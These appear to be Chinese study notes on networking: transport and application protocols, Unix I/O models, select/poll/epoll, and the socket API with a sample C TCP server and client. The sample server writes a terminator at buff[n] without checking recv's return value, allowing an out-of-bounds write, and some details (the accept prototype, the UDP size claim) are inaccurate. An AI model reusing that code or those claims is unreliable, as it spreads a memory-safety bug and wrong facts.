## 传输层

OSI模型中最重要的一层，是第一个端到端，即主机到主机的层次，其主要功能就是负责将上层数据分段并提供**端到端的、可靠的或不可靠**的传输。此外，传输层还要处理端到端的**差错控制和流量控制**问题。

网络层只把分组发送到目的主机，但是真正通信的并不是主机而是主机中的进程。传输层提供了进程间的逻辑通信，传输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看起来像是在两个传输层实体之间有一条端到端的逻辑通信信道。

TCP与UDP协议见文章

## 应用层

### 域名系统（DNS，Domain Name System）

DNS是一个分布式数据库，提供了主机名和 IP 地址之间相互转换的服务。这里的分布式数据库是指，每个站点只保留它自己的那部分数据。

域名具有层次结构，从上到下依次为：根域名`.`、顶级域名`edu,com,gov,cn...`、二级域名`google,baidu...`。

DNS 可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 `53`。大多数情况下 DNS 使用 UDP 进行传输，这就要求域名解析器和域名服务器都必须自己处理超时和重传从而保证可靠性。在两种情况下会使用 TCP 进行传输：

- 如果返回的响应超过的 512 字节（UDP 最大只支持 512 字节的数据）。
- 区域传送（区域传送是主域名服务器向辅助域名服务器传送变化的那部分数据）。

### 文件传送协议FTP/TFTP

#### FTP（File Transfer Protocol）

FTP 使用 TCP 进行连接，它需要两个连接来传送一个文件：

- 控制连接：服务器打开端口号 21 等待客户端的连接，客户端主动建立连接后，使用这个连接将客户端的命令传送给服务器，并传回服务器的应答。
- 数据连接：用来传送一个文件数据。

根据数据连接是否是服务器端主动建立，FTP 有主动和被动两种模式：

- 主动模式：服务器端主动建立数据连接，其中服务器端的端口号为 20，客户端的端口号随机，但是必须大于 1024，因为 0~1023 是熟知端口号。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ftp1.png" alt="img" style="zoom:60%;" />
</div>

- 被动模式：客户端主动建立数据连接，其中客户端的端口号由客户端自己指定，服务器端的端口号随机。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ftp2.png" alt="img" style="zoom:60%;" />
</div>

主动模式要求客户端开放端口号给服务器端，需要去配置客户端的防火墙。被动模式只需要服务器端开放端口号即可，无需客户端配置防火墙。但是被动模式会导致服务器端的安全性减弱，因为开放了过多的端口号。

#### TFTP（Trivial File Transfer Protocol）

简单文件传输协议：一个小且易实现的文件传输协议，使用客户-服务器方式，使用udp数据报，只支持文件传输不支持交互，没有列目录，不能对用户进行身份鉴定。

### 动态主机配置协议DHCP

DHCP（Dynamic Host Configuration Protocol）提供了即插即用的联网方式，用户不再需要手动配置 IP 地址等信息。

DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、网关 IP 地址。

DHCP 工作过程如下：

1. 客户端发送` Discover` 报文，该报文的目的地址为 `255.255.255.255:67`，源地址为 `0.0.0.0:68`，被放入 UDP 中，该报文被广播到同一个子网的所有主机上。如果客户端和 DHCP 服务器不在同一个子网，就需要使用中继代理。
2. DHCP 服务器收到 `Discover` 报文之后，发送 `Offer` 报文给客户端，该报文包含了客户端所需要的信息。因为客户端可能收到多个 DHCP 服务器提供的信息，因此客户端需要进行选择。
3. 如果客户端选择了某个 DHCP 服务器提供的信息，那么就发送` Request` 报文给该 DHCP 服务器。
4. DHCP 服务器发送 `Ack` 报文，表示客户端此时可以使用提供给它的信息。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\dhcp.png" alt="img" style="zoom:80%;" />
</div>

### 远程登录协议TELNET

TELNET（Telecommunication Network Protocol）电信网络协议是`tcp/ip`协议族中的一员，是internet远程登陆服务的标准协议和主要方式。他为用户提供了在本地计算机上完成远程主机工作的能力。

### 电子邮件协议SMTP/POP3/IMAP

一个电子邮件系统由三部分组成：用户代理、邮件服务器以及邮件协议。

邮件协议包含发送协议和读取协议，发送协议常用 SMTP，读取协议常用 POP3 和 IMAP。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\mail.png" alt="img" style="zoom:50%;" />
</div>

#### SMTP

Simple Mail Transfer Protocol，简单邮件传输协议是一组用于由源地址到目的地址传送邮件的规则，由他来控制信件的中转方式。

SMTP协议属于`tcp/ip`协议簇，他帮助每台计算机在发送或中转信件时找到下一个目的地。

SMTP只能发送ascii码，而互联网邮件扩充mime可以发送二进制文件，增加了邮件主体的结构，定义了非ascii码的编码规则。

#### POP3

POP3 的特点是只要用户从服务器上读取了邮件，就把该邮件删除。但最新版本的 POP3 可以不删除邮件。

#### IMAP

IMAP 协议中客户端和服务器上的邮件保持同步，如果不手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。

### WWW

www（World Wide Web）万维网是一个由许多互相链接的超文本组成的系统，通过互联网访问

### HTTP

见其他文章

# 计算机网络之SOCKET

Socket是在传输层抽象出来的一个抽象层，本质是一个接口。

## I/OIO模型

一个输入操作通常包括两个阶段：

- 等待数据准备好
- 从内核向进程复制数据

对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。

Unix 有五种 I/O 模型：

- 阻塞式 I/O
- 非阻塞式 I/O
- I/O 复用（select 和 poll）
- 信号驱动式 I/O（SIGIO）
- 异步 I/O（AIO）

### 阻塞式I/O

应用进程被阻塞，直到数据从内核缓冲区复制到应用进程缓冲区中才返回。

应该注意到，在阻塞的过程中，其它应用进程还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其它应用进程还可以执行，所以不消耗 CPU 时间，这种模型的 CPU 利用率会比较高。

下图中，`recvfrom()` 用于接收 Socket 传来的数据，并复制到应用进程的缓冲区 `buf` 中。这里把 `recvfrom()` 当成系统调用。

```c++
ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);
```

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\blockIO.png" alt="img" style="zoom:80%;" />
</div>


### 非阻塞式IO

应用进程执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不断的执行系统调用来获知 I/O 是否完成，这种方式称为轮询（polling）。

由于 CPU 要处理更多的系统调用，因此这种模型的 CPU 利用率比较低。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\noblockIO.png" alt="img" style="zoom:80%;" />
</div>


### I/O复用

使用 `select` 或者 `poll` 等待数据，并且可以等待多个套接字中的任何一个变为可读。这一过程**会被阻塞**，当某一个套接字可读时返回，之后再使用 `recvfrom` 把数据从内核复制到进程中。

它可以让单个进程具有处理多个 I/O 事件的能力。又被称为 `Event Driven I/O`，即事件驱动 I/O。

如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时有几万个连接，那么就需要创建相同数量的线程。相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\IOreuse.png" alt="img" style="zoom:80%;" />
</div>


### 信号驱动I/O

应用进程使用 `sigaction` 系统调用，内核立即返回，应用进程可以继续执行，也就是说**等待数据阶段应用进程是非阻塞的**。内核在数据到达时向应用进程发送 SIGIO 信号，应用进程收到之后在信号处理程序中调用 `recvfrom` 将数据从内核复制到应用进程中。

相比于非阻塞式 I/O 的轮询方式，信号驱动 I/O 的 CPU 利用率更高。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\signalIO.png" alt="img" style="zoom:80%;" />
</div>


### 异步I/O

应用进程执行 `aio_read` 系统调用会立即返回，应用进程可以继续执行，不会被阻塞，内核会在所有操作完成之后向应用进程发送信号。

异步 I/O 与信号驱动 I/O 的区别在于，**异步 I/O 的信号是通知应用进程 I/O 完成，而信号驱动 I/O 的信号是通知应用进程可以开始 I/O。**

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\asynIO.png" alt="img" style="zoom:80%;" />
</div>


### 模型比较

- 同步 I/O：将数据从内核缓冲区复制到应用进程缓冲区的阶段（第二阶段），应用进程会阻塞。
- 异步 I/O：第二阶段应用进程不会阻塞。

同步 I/O 包括阻塞式 I/O、非阻塞式 I/O、I/O 复用和信号驱动 I/O ，它们的主要区别在第一个阶段。

非阻塞式 I/O 、信号驱动 I/O 和异步 I/O 在第一阶段不会阻塞。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\IO.png" alt="img" style="zoom:80%;" />
</div>


## I/OIO复用

`select/poll/epoll` 都是 I/O 多路复用的具体实现，`select` 出现的最早，之后是 `poll`，再是 `epoll`。

### select

```c++
int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);
```

select 允许应用程序监视一组文件描述符，等待一个或者多个描述符成为就绪状态，从而完成 I/O 操作。

- `fd_set` 使用数组实现，数组大小使用 FD_SETSIZE 定义，所以只能监听少于 FD_SETSIZE 数量的描述符。有三种类型的描述符类型：`readset`、`writeset`、`exceptset`，分别对应读、写、异常条件的描述符集合。
- timeout 为超时参数，调用 select 会一直阻塞直到有描述符的事件到达或者等待的时间超过 `timeout`。
- 成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0。

单个进程可监视的fd数量有限制，即能监听端口的大小有限。

对socket进行扫描时是线性扫描，即采用轮询的方式，效率较低。

需要维护一个用来存放大量fd的数据结构，这样会使得用户空间和内核空间在传毒该结构时复制开销大。

### poll

`poll `的功能与 `select` 类似，也是等待一组描述符中的一个成为就绪状态。和select本质上没有区别，它将用户传入的数组拷贝到内核空间，然后查询每个fd对应的设备状态，如果设备就绪则在设备等待队列中加入一项并继续遍历，如果遍历完所有fd后而没有发现就绪设备，则挂起当前进程，直到设备就绪或者主动超时，被唤醒后又要再次遍历fd。

```c++
int poll(struct pollfd *fds, unsigned int nfds, int timeout);
```

`poll` 中的描述符是 `pollfd` 类型的数组，`pollfd` 的定义如下：

```c++
struct pollfd {
	int   fd;         /* file descriptor */
	short events;     /* requested events */
	short revents;    /* returned events */
};
```

没有最大连接数的限制，因为它是基于链表来存储的。

### select和poll比较

#### 功能

`select` 和 `poll` 的功能基本相同，不过在一些实现细节上有所不同。

- `select` 会修改描述符，而 poll 不会；
- `select` 的描述符类型使用数组实现，`FD_SETSIZE` 大小默认为 1024，因此默认只能监听少于 1024 个描述符。如果要监听更多描述符的话，需要修改 `FD_SETSIZE` 之后重新编译；而 `poll` 没有描述符数量的限制；
- `poll` 提供了更多的事件类型，并且对描述符的重复利用上比 select 高。
- 如果一个线程对某个描述符调用了 `select` 或者 `poll`，另一个线程关闭了该描述符，会导致调用结果不确定。

#### 速度

`select 和 poll` 速度都比较慢，**每次调用都需要将全部描述符从应用进程缓冲区复制到内核缓冲区。**

#### 可移植性

几乎所有的系统都支持 `select`，但是只有比较新的系统支持 `poll`。

### epoll

```c++
int epoll_create(int size);
int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；
int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);
```

`epoll_ctl()` 用于向内核注册新的描述符或者是**改变某个文件描述符的状态**。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理，进程调用 `epoll_wait()` 便可以得到事件完成的描述符。

从上面的描述可以看出，`epoll` 只需要将描述符从进程缓冲区向内核缓冲区拷贝一次，并且进程不需要通过轮询来获得事件完成的描述符。

`epoll` 仅适用于 **Linux OS。**

`epoll` 比 `select` 和 `poll` 更加灵活而且没有描述符数量限制。

可以理解为event poll，不同于忙轮询和无差别轮询，epoll会把哪个流发生了怎么样的IO事件通知我们，所以说epoll实际上是事件驱动（每个事件关联上fd）的，此时我们对这些流的操作都是有意义的。

`epoll` 对多线程编程更有友好，一个线程调用了 `epoll_wait()` 另一个线程关闭了同一个描述符也不会产生像 `select` 和 `poll` 的不确定情况。

### epoll工作模式

`epoll` 的描述符事件有两种触发模式：`LT（level trigger`）和 `ET（edge trigger）`

#### LT模式

当 `epoll_wait()` 检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用 `epoll_wait()` 会再次通知进程。是默认的一种模式，并且同时支持 `Blocking` 和 `No-Blocking`。

编程与poll/select接近，符合一直以来的习惯，不易出错。

#### ET模式（高速模式）

和 LT 模式不同的是，通知之后进程必须立即处理事件，下次再调用 `epoll_wait()` 时不会再得到事件到达的通知。

很大程度上减少了 `epoll` 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 `No-Blocking`，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。

这种模式比水平触发效率高，系统不会充斥大量不关心的就绪文件描述符。

ET的编程可以做到更加简洁，某些场景下更高效，但另一方面容易遗漏事件，容易产生bug。

##### 为什么要设置成非阻塞型IO

ET模式下每次write或者read需要循环write或read直到返回EAGAIN错误。以读操作为例，这时因为ET模式只在socket描述符状态发生变化时才触发事件，如果下一次把socket内核缓冲区的数据读完，会导致socket内核缓冲区中即使还有一部分数据，该socket的可读事件也不会触发。所以如果使用阻塞性IO，则程序一定会阻塞在最后一次write或者read操作，即一定要使用非阻塞型IO。

#### LT模式相比于ET模式

- 优点：事件循环处理简单，无序关注应用层是否有缓冲区或者缓冲区是否满，只管上报事件就可以了
- 缺点：可能经常上报，导致影响性能。

#### epoll优点

- 没有最大描述符的限制，远大于1024
- 效率提升，不是轮询的方式，不会随着fd数目增加效率下降，只有活跃可用的fd才会调用callback函数；即epoll最大的优点在于它只管活跃的链接，而和链接总数无关，因此在实际的网络环境中，epoll的效率远高于select和poll
- 内存拷贝，利用mmap()文件映射内存加速与内核空间的消息传递；即epoll适用mmap减少复制开销。

### 应用场景

很容易产生一种错觉认为只要用 `epoll` 就可以了，`select` 和 `poll` 都已经过时了，其实它们都有各自的使用场景。

#### select

`select` 的 `timeout` 参数精度为微秒，而 `poll` 和 `epoll` 为毫秒，因此 `select` 更加适用于实时性要求比较高的场景，比如核反应堆的控制。

`select` 可移植性更好，几乎被所有主流平台所支持。

#### poll

`poll` 没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用 `poll` 而不是 `select`。

#### epoll

只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。

需要同时监控小于 1000 个描述符，就没有必要使用 `epoll`，因为这个应用场景下并不能体现 `epoll` 的优势。

需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用 `epoll`。因为 `epoll` 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 `epoll_ctl()` 进行系统调用，频繁系统调用降低效率。并且 `epoll` 的描述符存储在内核，不容易调试。

## Socket编程

`socket`起源于`Unix`，而`Unix/Linux`基本哲学之一就是“一切皆文件”，都可以用“`打开open –> 读写write/read –> 关闭close`”模式来操作。Socket就是该模式的一个实现，socket即是一种特殊的文件，一些socket函数就是对其进行的操作（读/写IO、打开、关闭）

### socket()函数

```c++
int socket(int domain, int type, int protocol);
```

socket函数对应于普通文件的打开操作。普通文件的打开操作返回一个文件描述字，而**socket()**用于创建一个socket描述符（`socket descriptor`），它唯一标识一个socket。这个socket描述字跟文件描述字一样，后续的操作都有用到它，把它作为参数，通过它来进行一些读写操作。

正如可以给`fopen`的传入不同参数值，以打开不同的文件。创建socket的时候，也可以指定不同的参数创建不同的socket描述符，socket函数的三个参数分别为：

- `domain`：即协议域，又称为协议族（family）。常用的协议族有，`AF_INET`、`AF_INET6`、`AF_LOCAL`（或称`AF_UNIX`，Unix域socket）、`AF_ROUTE`等等。协议族决定了socket的地址类型，在通信中必须采用对应的地址，如AF_INET决定了要用ipv4地址（32位的）与端口号（16位的）的组合、AF_UNIX决定了要用一个绝对路径名作为地址。
- `type`：指定socket类型。常用的socket类型有，`SOCK_STREAM`、`SOCK_DGRAM`、`SOCK_RAW`、`SOCK_PACKET`、`SOCK_SEQPACKET`等等（socket的类型有哪些？）。
- `protocol`：顾名思义，就是指定协议。常用的协议有，`IPPROTO_TCP`、`IPPTOTO_UDP`、`IPPROTO_SCTP`、`IPPROTO_TIPC`等，它们分别对应TCP传输协议、UDP传输协议、STCP传输协议、TIPC传输协议）。

注意：**并不是上面的type和protocol可以随意组合的**，如SOCK_STREAM不可以跟IPPROTO_UDP组合。当protocol为0时，会自动选择type类型对应的默认协议。

当我们调用**socket**创建一个socket时，返回的socket描述字它存在于协议族（address family，AF_XXX）空间中，但没有一个具体的地址。如果想要给它赋值一个地址，就必须调用bind()函数，否则就当调用connect()、listen()时系统会自动随机分配一个端口。

### bind()函数

```c++
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

函数的三个参数分别为：

- `sockfd`：即socket描述字，它是通过socket()函数创建了，唯一标识一个socket。bind()函数就是将给这个描述字绑定一个名字。
- `addr`：一个`const struct sockaddr *`指针，指向要绑定给`sockfd`的协议地址。这个地址结构根据地址创建socket时的地址协议族的不同而不同

- `addrlen`：对应的是地址的长度。

通常服务器在启动的时候都会绑定一个众所周知的地址（如`ip地址+端口号`），用于提供服务，客户就可以通过它来接连服务器；而客户端就不用指定，有系统自动分配一个`端口号和自身的ip地址`组合。这就是为什么通常**服务器端在listen之前会调用bind()**，而客户端就不会调用，而是在connect()时由系统随机生成一个。

### listen(),connect()函数

如果作为一个服务器，在调用`socket()`、`bind()`之后就会调用`listen()`来监听这个socket，如果客户端这时调用`connect()`发出连接请求，服务器端就会接收到这个请求。

```c++
int listen(int sockfd, int backlog);
int connect(int sockfd, const struct sockaddr* addr, socklen_t addrlen);
```

listen函数的参数：

- `sockfd`：即为要监听的socket描述字
- `backlog`：相应socket可以排队的最大连接个数。
- socket()函数创建的socket默认是一个主动类型的，listen函数将socket变为被动类型的，等待客户的连接请求。

connect函数的参数：

- `sockfd`：即为客户端的socket描述字
- `addr`：服务器的socket地址
- `addrlen`：socket地址的长度
- 客户端通过调用connect函数来建立与TCP服务器的连接。

### accept()函数

TCP服务器端依次调用`socket()`、`bind()`、`listen()`之后，就会监听指定的socket地址了。TCP客户端依次调用socket()、connect()之后就想TCP服务器发送了一个连接请求。TCP服务器监听到这个请求之后，就会调用accept()函数取接收请求，这样连接就建立好了。之后就可以开始网络I/O操作了，即类同于普通文件的读写I/O操作。

```c++
int accept(int sockfd, struct sockaddr* addr, socklen_t addrlen);
```

accept函数的参数：

- `sockfd`：服务器的socket描述字
- `addr`：指向`struct sockaddr *`的指针，用于返回客户端的协议地址
- `addrlen`：协议地址的长度

- 如果`accpet`成功，那么其返回值是由内核自动生成的一个**全新的描述字**，代表与返回客户的TCP连接。

**注意**：accept的第一个参数为服务器的socket描述字，是服务器开始调用socket()函数生成的，称为**监听socket描述字**；而accept函数返回的是已连接的socket描述字。一个服务器通常通常**仅仅只创建一个监听socket描述字**，它在该服务器的生命周期内一直存在。内核为每个由服务器进程接受的客户连接创建了一个已连接socket描述字，当服务器完成了对某个客户的服务，相应的已连接socket描述字就被关闭。

### read(),write()等函数

```c++
 ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags);
 ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);
```

read函数是负责从`fd`中读取内容。当读成功时，read返回实际所读的字节数，如果返回的值是0表示已经读到文件的结束了，小于0表示出现了错误。如果错误为EINTR说明读是由中断引起的，如果是`ECONNREST`表示网络连接出了问题。

write函数将`buf`中的`nbytes`字节内容写入文件描述符`fd`。成功时返回写的字节数。失败时返回-1，并设置`errno`变量。 在网络程序中，当我们向套接字文件描述符写时有两种可能。

- write的返回值大于0，表示写了部分或者是全部的数据。
- 返回的值小于0，此时出现了错误。我们要根据错误类型来处理。如果错误为EINTR表示在写的时候出现了中断错误。如果为`EPIPE`表示网络连接出现了问题(对方已经关闭了连接)。

### close()函数

在服务器与客户端建立连接之后，会进行一些读写操作，完成了读写操作就要关闭相应的socket描述字，好比操作完打开的文件要调用`fclose`关闭打开的文件。

```c++
int close(int sockfd);
```

close一个TCP socket的缺省行为时把该socket标记为以关闭，然后立即返回到调用进程。该描述字不能再由调用进程使用，也就是说不能再作为read或write的第一个参数。

**注意**：close操作只是使相应socket描述字的引用计数-1，只有当引用计数为0的时候，才会触发TCP客户端向服务器发送终止连接请求。

## Socket中TCP的三次握手和四次挥手

### 三次握手

- 客户端向服务器发送一个`SYN J`
- 服务器向客户端响应一个`SYN K`，并对`SYN J`进行确认`ACK J+1`
- 客户端再想服务器发一个确认`ACK K+1`

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\socketconnect.png" alt="img" style="zoom:100%;" />
</div>


从图中可以看出：

- 当客户端调用`connect`时，触发了连接请求，向服务器发送了`SYN J`包，这时`connect`进入阻塞状态；
- 服务器监听到连接请求，即收到`SYN J`包，调用`accept`函数接收请求向客户端发送`SYN K` ，`ACK J+1`，这时`accept`进入阻塞状态；
- 客户端收到服务器的`SYN K` ，`ACK J+1`之后，这时`connect`返回，并对`SYN K`发送`ACK K+1`进行确认；
- 服务器收到`ACK K+1`时，`accept`返回，至此三次握手完毕，连接建立。

> 客户端的connect在三次握手的第二个次返回，而服务器端的accept在三次握手的第三次返回。

### 四次挥手

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\socketdisconnect.png" alt="img" style="zoom:100%;" />
</div>


- 某个应用进程首先调用`close`主动关闭连接，这时TCP发送一个`FIN M`；
- 另一端接收到`FIN M`之后，执行被动关闭，对这个FIN进行确认。它的接收也作为文件结束符传递给应用进程，因为FIN的接收意味着应用进程在相应的连接上再也接收不到额外数据；
- 一段时间之后，接收到文件结束符的应用进程调用close关闭它的socket。这导致它的TCP也发送一个`FIN N`；
- 接收到这个FIN的源发送端TCP对它进行确认。

## 一个socket使用例子

### 服务端

```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define MAXLINE 4096

int main(){
    int listenfd, connfd;
    struct sockaddr_in servaddr;
    char buff[4096];
    int n;
    if((listenfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        printf("create socket error : %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(6666);

    if(bind(listenfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) == -1){
        printf("bind socket error: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }
    if(listen(listenfd, 10) == -1){
        printf("listen socket wrror: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }
    printf("-----------waiting for client's request----------------\n");
    while(1){
        if((connfd = accept(listenfd, (struct sockaddr*)NULL, NULL)) == -1){
            printf("accept socket error: %s(errno: %d)\n", strerror(errno), errno);
            continue;
        }
        n = recv(connfd, buff, MAXLINE, 0);
        buff[n] = '\0';
        printf("recv msg from client: %s\n", buff);
        close(connfd);
    }

    close(listenfd);

    return 0;
}
```

### 客户端

```c++
#include <stdio.h>
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAXLINE 4096

int main(int argc, char** argv)
{
        int    sockfd, n;
        char    recvline[4096], sendline[4096];
        struct sockaddr_in    servaddr;
        if( argc != 2){
                printf("usage: ./client <ipaddress>\n");
                exit(0);
        }

        if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
                printf("create socket error: %s(errno: %d)\n", strerror(errno),errno);
                exit(0);
        }

        memset(&servaddr, 0, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(6666);
        if( inet_pton(AF_INET, argv[1], &servaddr.sin_addr) <= 0){
                printf("inet_pton error for %s\n",argv[1]);
                exit(0);
        }

        if( connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0){
                printf("connect error: %s(errno: %d)\n",strerror(errno),errno);
                exit(0);
        }

        printf("send msg to server: \n");
        fgets(sendline, 4096, stdin);
        if( send(sockfd, sendline, strlen(sendline), 0) < 0)
        {
                printf("send msg error: %s(errno: %d)\n", strerror(errno), errno);
                exit(0);
        }

        close(sockfd);
        exit(0);
        return 0;
}
```

# 计算机网络之TCP/UDP

## TCP

TCP（Transmission Control Protocol，传输控制协议）是一种**面向连接的，可靠的，基于字节流的传输层通信协议**，传输的单位是报文段。

适用于HTTP，FTP，SMTP，TELNET等，因为对于文件传输、远程终端来说，是不允许数据丢失的，TCP的可靠性可以满足该要求。

### 特点

- 面向连接
- 提供可靠交互
- 提供全双工通信
- 面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块）
- 点对点通信（一对一）

### 保证可靠交互

- 确认和超时重传
- 数据合理分片和排序
- 流量控制
- 拥塞控制
- 数据校验：保证数据的正确性，保证数据内容不会出错
  - 发送方将伪首部，TCP首部，TCP数据使用累加和校验的方式计算出一个数字，然后存放在首部的校验和字段中，接收者收到TCP包重复这个过程，然后比较，如果不一致则说明出错了。
  - 但是不能检测出一切错误，比如传输过程中前后两个字节的数据前后颠倒了，数据校验无法检测出错误。
  - **应用层添加MD5校验**可以解决这个问题

### TCP头部

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\tcpheader.png" alt="img" style="zoom:40%;" />
</div>


- **序号** ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。
- **确认号** ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。
- **数据偏移** ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。
- **确认 ACK** ：当 `ACK=1` 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。
- **同步 SYN** ：在连接建立时用来同步序号。当 `SYN=1，ACK=0` 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 `SYN=1，ACK=1`。
- **终止 FIN** ：用来释放一个连接，当 `FIN=1` 时，表示此报文段的发送方的数据已发送完毕，并要求释放连接。
- **窗口** ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。

### TCP可靠传输

TCP使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就**重传这个报文段**。

一个报文段从发送再到接收到确认所经过的时间称为`RTT`，加权平均往返时间`RTTs`计算如下：

`RTTs=(1-a)*(RTTs)+a*RTT,0<=a<1`，`RTTs`随着a的增长更容易受到`RTT`的影响。

超时时间`RTO`应该略大于`RTTs`，TCP使用的超时时间计算如下：

`RTO=RTTs+4*RTTd`，其中`RTTd`为偏差的加权平均值。

### TCP滑动窗口

窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。

发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。

接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {34, 35} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\slidewin.png" alt="img" style="zoom:60%;" />
</div>


### TCP流量控制

流量控制是为了**控制发送方发送速率**，保证接收方来得及接收。

接收方发送的确认报文中的窗口字段可以用来**控制发送方窗口大小**，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。

### TCP拥塞控制

如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接收，而拥塞控制是为了降低整个网络的拥塞程度。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\congestioncontrol.png" alt="img" style="zoom:40%;" />
</div>


TCP 主要通过四个算法来进行拥塞控制：**慢开始、拥塞避免、快重传、快恢复**。

发送方需要维护一个叫做拥塞窗口（`cwnd`）的状态变量，注意拥塞窗口与发送方窗口的区别：拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。

为了便于讨论，做如下假设：

- 接收方有足够大的接收缓存，因此不会发生流量控制；
- 虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\cwnd.png" alt="img" style="zoom:30%;" />
</div>


#### 慢开始与拥塞避免

发送的最初执行**慢开始**，令 `cwnd = 1`，发送方只能发送 1 个报文段；当收到确认后，将 `cwnd` 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 ...

注意到慢开始每个轮次都将 `cwnd` 加倍，这样会让 `cwnd` 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能性也就更高。

设置一个慢开始门限 `ssthresh`，当 `cwnd` >= `ssthresh` 时，进入**拥塞避免**，每个轮次只将 `cwnd` 加 1。

如果出现了超时，则令 `ssthresh = cwnd / 2`，然后重新执行慢开始。

#### 快重传和快恢复

在接收方，要求每次接收到报文段都应该对最后一个已收到的有序报文段进行确认。例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。

